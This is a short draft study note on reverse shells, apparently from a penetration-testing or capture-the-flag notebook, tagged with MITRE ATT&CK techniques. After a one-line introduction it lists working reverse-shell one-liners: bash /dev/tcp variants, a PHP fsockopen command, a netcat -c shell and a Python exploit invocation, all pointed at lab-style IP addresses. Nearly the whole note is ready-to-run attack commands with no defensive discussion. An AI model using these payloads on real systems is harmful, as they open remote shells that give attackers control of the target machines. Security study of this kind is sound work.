---
title: Reverse Shells
aliases: []
tags:
- study-notes
- techniques/t1132
- techniques/t1059
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: shells.md
related_tools:
- '[[bash]]'
- '[[nc]]'
- '[[python3]]'
related_techniques:
- '[[T1132.001]]'
- '[[t1059]]'
related_tactics:
- '[[ta0003]]'
related_services:
- '[[http]]'
related_os: []
related_notes: []
mitre_tactic: TA0003
mitre_technique: T1132.001, T1059
real_path: ''
port: ''
protocol: ''
os: linux
---

# Reverse Shells

## Reverse Shells
Reverse shells are a common technique used by attackers to gain a persistent command-line interface on a target system. Below are several examples of how to establish a reverse shell using different tools and methods.

### Bash

```bash
# Using bash to establish a reverse shell
bash -i >& /dev/tcp/10.10.14.14/4321 0>&1

# Another variant
/usr/bin/bash -i >& /dev/tcp/10.10.14.14/80 0>&1

# Yet another variant
/usr/bin/bash -l > /dev/tcp/10.10.10.14/80 0<&1 2>&1
```

### PHP

```bash
# Using PHP to establish a reverse shell
php -r "$sock=fsockopen('10.10.14.14',4321);exec('/usr/bin/bash -i <&3 >&3 2>&3');"
```

### Netcat

```bash
# Using netcat to establish a reverse shell
/usr/bin/nc -c /usr/bin/sh 10.10.14.14 9001
```

### Python

```bash
# Using Python to establish a reverse shell
python3 revshell_php_8.1.0-dev.py http://10.10.10.242 10.10.10.14 9001
```

